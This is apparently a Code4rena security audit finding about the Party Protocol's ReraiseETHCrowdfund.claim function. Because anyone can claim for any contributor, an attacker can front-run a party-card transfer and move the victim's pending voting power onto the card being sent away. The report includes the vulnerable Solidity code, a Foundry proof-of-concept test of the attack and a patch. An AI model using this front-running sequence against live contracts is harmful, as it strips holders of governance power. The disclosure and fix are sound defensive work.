## Tags

- bug
- 3 (High Risk)
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- H-05

# [ReraiseETHCrowdfund.sol: party card transfer can be front-run by claiming pending voting power which results in a loss of the voting power](https://github.com/code-423n4/2023-04-party-findings/issues/12) 

# Lines of code

https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303


# Vulnerability details

## Impact
In this report I show how an attacker can abuse the fact that anyone can call [`ReraiseETHCrowdfund.claim`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303) for any user and add voting power to an existing party card.  

The result can be a griefing attack whereby the victim loses voting power. In some cases the attacker can take advantage himself.  

In short this is what needs to happen:  
1. The victim sends a transaction to transfer one of his party cards
2. The transaction is front-run and pending voting power of the victim from the `ReraiseETHCrowdfund` contract is claimed to this party card that is transferred
3. The victim thereby loses the pending voting power

The fact that any user is at risk that has pending voting power and transfers a party card and that voting power is arguably the most important asset in the protocol makes me estimate this to be "High" severity.  

## Proof of Concept
We start by observing that when the `ReraiseETHCrowdfund` is won, any user can call `ReraiseETHCrowdfund.claim` for any other user and either mint a new party card to him or add the pending voting power to an existing party card:  

[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303)  
```solidity
/// @notice Claim a party card for a contributor if the crowdfund won. Can be called
///         to claim for self or on another's behalf.
/// @param tokenId The ID of the party card to add voting power to. If 0, a
///                new card will be minted.
/// @param contributor The contributor to claim for.
function claim(uint256 tokenId, address contributor) public {
    // Check crowdfund lifecycle.
    {
        CrowdfundLifecycle lc = getCrowdfundLifecycle();
        if (lc != CrowdfundLifecycle.Finalized) {
            revert WrongLifecycleError(lc);
        }
    }


    uint96 votingPower = pendingVotingPower[contributor];


    if (votingPower == 0) return;


    {
        uint96 contribution = (votingPower * 1e4) / exchangeRateBps;
        uint96 maxContribution_ = maxContribution;
        // Check that the contribution equivalent of total pending voting
        // power is not above the max contribution range. This can happen
        // for contributors who contributed multiple times In this case, the
        // `claimMultiple` function should be called instead. This is done
        // so parties may use the minimum and maximum contribution values to
        // limit the voting power of each card (e.g.  a party desiring a "1
        // card = 1 vote"-like governance system where each card has equal
        // voting power).
        if (contribution > maxContribution_) {
            revert AboveMaximumContributionsError(contribution, maxContribution_);
        }
    }


    // Burn the crowdfund NFT.
    _burn(contributor);


    delete pendingVotingPower[contributor];


    if (tokenId == 0) {
        // Mint contributor a new party card.
        tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);
    } else if (disableContributingForExistingCard) {
        revert ContributingForExistingCardDisabledError();
    } else if (party.ownerOf(tokenId) == contributor) {
        // Increase voting power of contributor's existing party card.
        party.addVotingPower(tokenId, votingPower);
    } else {
        revert NotOwnerError();
    }


    emit Claimed(contributor, tokenId, votingPower);
}
```

Note that the caller can specify any `contributor` and can add the pending votes to an existing party card if `!disableContributingForExistingCard && party.ownerOf(tokenId) == contributor`.  

So if User A has pending voting power and transfers one of his party cards to User B, then User C might front-run this transfer and claim the pending voting power to the party card that is transferred.  

If User B performs this attack it is not a griefing attack since User B benefits from it.  

Note that at the time of sending the transfer transaction the `ReraiseETHCrowdfund` does not have to be won already. The transaction that does the front-running might contribute to the crowdfund such that it is won and then claim the pending voting power.  

Add the following test to the `ReraiseETHCrowdfund.t.sol` test file. It shows how an attacker would perform such an attack:  

```solidity
function test_FrontRunTransfer() public {
    ReraiseETHCrowdfund crowdfund = _createCrowdfund({
        initialContribution: 0,
        initialContributor: payable(address(0)),
        initialDelegate: address(0),
        minContributions: 0,
        maxContributions: type(uint96).max,
        disableContributingForExistingCard: false,
        minTotalContributions: 2 ether,
        maxTotalContributions: 3 ether,
        duration: 7 days,
        fundingSplitBps: 0,
        fundingSplitRecipient: payable(address(0))
    });

    address attacker = _randomAddress();
    address victim = _randomAddress();
    vm.deal(victim, 2.5 ether);
    vm.deal(attacker, 0.5 ether);

    // @audit-info the victim owns a party card
    vm.prank(address(party));
    party.addAuthority(address(this));
    party.increaseTotalVotingPower(1 ether);
    uint256 victimTokenId = party.mint(victim, 1 ether, address(0));


    vm.startPrank(victim);
    crowdfund.contribute{ value: 2.5 ether }(victim, "");
    vm.stopPrank();

    /* @audit-info
    The victim wants to transfer the party card, say to the attacker, and the attacker
    front-runs this by completing the crowdfund and claiming the victim's pending voting
    power to the existing party card
    */

    vm.startPrank(attacker);
    crowdfund.contribute{ value: 0.5 ether }(attacker, "");
    crowdfund.claim(victimTokenId,victim);
    vm.stopPrank();

    /* @audit-info
    when the victim's transfer is executed, he transfers also all of the voting power
    that was previously his pending voting power (effectively losing it)
    */
    vm.prank(victim);
    party.tranferFrom(victim,attacker,victimTokenId);
}
```

So when there is an ongoing crowdfund it is never safe to transfer one's party card. It can always result in a complete loss of the pending voting power.  

## Tools Used
VSCode

## Recommended Mitigation Steps
In the `ReraiseETHCrowdfund.claim` function it should not be possible to add the pending voting power to an existing party card. It is possible though to allow it for the `contributor` himself but not for any user.  

```diff
diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol
index 580623d..cb560e1 100644
--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol
+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol
@@ -292,7 +292,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {
             tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);
         } else if (disableContributingForExistingCard) {
             revert ContributingForExistingCardDisabledError();
-        } else if (party.ownerOf(tokenId) == contributor) {
+        } else if (party.ownerOf(tokenId) == contributor && contributor == msg.sender) {
             // Increase voting power of contributor's existing party card.
             party.addVotingPower(tokenId, votingPower);
         } else {
```
